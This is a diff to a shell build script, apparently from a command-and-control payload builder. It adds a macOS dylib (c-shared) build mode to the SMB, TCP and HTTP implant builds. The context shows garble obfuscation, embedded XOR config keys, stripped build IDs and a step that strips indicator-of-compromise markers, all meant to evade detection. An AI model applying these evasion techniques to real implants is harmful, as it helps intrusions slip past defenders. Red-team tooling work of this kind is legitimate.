@@ -208,6 +208,28 @@ build_binary() {
         echo "==========================="
     fi
 
+    # Handle dylib format for Darwin (c-shared buildmode)
+    BUILDMODE_FLAG=""
+    if [ "${FORMAT}" = "dylib" ] && [ "${os}" = "darwin" ]; then
+        echo "=== Dylib Build Mode (c-shared) ==="
+        if [ -n "${BUILD_TAGS}" ]; then
+            BUILD_TAGS=$(echo "${BUILD_TAGS}" | sed 's/-tags //')
+            BUILD_TAGS="-tags ${BUILD_TAGS},build_dylib"
+        else
+            BUILD_TAGS="-tags build_dylib"
+        fi
+        export CGO_ENABLED=1
+        if [ "${arch}" = "arm64" ]; then
+            export CC="zig cc -target aarch64-macos"
+        else
+            export CC="zig cc -target x86_64-macos"
+        fi
+        BUILDMODE_FLAG="-buildmode=c-shared"
+        echo "CC: ${CC}"
+        echo "Build tags: ${BUILD_TAGS}"
+        echo "==================================="
+    fi
+
     # Display HTTP method configuration
     echo "=== HTTP Method Configuration ==="
     echo "GET method: ${GET_METHOD:-GET}"
@@ -315,7 +337,7 @@ PYEOF
     # Use different ldflags for SMB, TCP, and HTTP payloads
     if [ "${PAYLOAD_TYPE}" = "smb" ]; then
         # SMB payload - uses config key for runtime decryption
-        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build ${BUILD_TAGS} \
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build ${BUILDMODE_FLAG} ${BUILD_TAGS} \
             -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
             -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
@@ -383,7 +405,7 @@ PYEOF
             -trimpath -o "/output/${OUTPUT_FILENAME}"
     elif [ "${PAYLOAD_TYPE}" = "tcp" ]; then
         # TCP payload - uses config key for runtime decryption
-        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build ${BUILD_TAGS} \
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build ${BUILDMODE_FLAG} ${BUILD_TAGS} \
             -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
             -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
@@ -450,7 +472,7 @@ PYEOF
             -trimpath -o "/output/${OUTPUT_FILENAME}"
     else
         # HTTP payload - full ldflags
-        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny build ${BUILD_TAGS} \
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny build ${BUILDMODE_FLAG} ${BUILD_TAGS} \
             -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
             -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
@@ -548,6 +570,10 @@ PYEOF
     fi
 
     echo "Binary successfully built: /output/${OUTPUT_FILENAME}"
+
+    # Clean up c-shared header file if present (dylib builds generate one)
+    HEADER_FILE="/output/$(echo ${OUTPUT_FILENAME} | sed 's/\.[^.]*$//').h"
+    [ -f "${HEADER_FILE}" ] && rm -f "${HEADER_FILE}"
 
     # Post-build processing to strip IOC markers
     echo "[*] Running post-build processing..."
